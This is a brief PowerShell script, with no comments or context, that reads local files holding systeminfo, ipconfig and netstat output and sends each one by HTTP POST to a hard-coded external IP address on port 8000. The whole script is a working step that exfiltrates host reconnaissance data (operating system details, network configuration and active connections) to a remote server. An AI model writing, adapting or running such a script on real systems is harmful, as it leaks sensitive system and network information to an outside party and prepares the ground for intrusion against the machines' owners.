$content = Get-Content .\systeminfo.txt
$uri = "140.113.89.105:8000"

Invoke-RestMethod -Uri $uri -Body $content  -Method Post
$content = Get-Content .\ipconfig.txt
Invoke-RestMethod -Uri $uri -Body $content  -Method Post
$content = Get-Content .\netstat.txt
Invoke-RestMethod -Uri $uri -Body $content  -Method Post